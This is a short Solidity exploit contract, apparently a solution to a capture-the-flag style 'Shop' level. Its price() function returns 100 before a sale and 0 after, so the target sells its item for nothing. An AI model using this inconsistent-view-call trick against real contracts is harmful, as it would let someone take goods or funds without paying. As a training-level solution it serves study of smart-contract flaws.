// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Shop.sol";

function playerScript(address instanceAddress) {
    new ShopExploit().exploit(instanceAddress);
}

contract ShopExploit is Buyer {
    address instanceAddress;

    function exploit(address instanceAddress_) public {
        instanceAddress = instanceAddress_;
        Shop instance = Shop(instanceAddress);
        instance.buy();
    }

    function price() public view returns (uint256) {
        Shop instance = Shop(instanceAddress);
        if (instance.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}
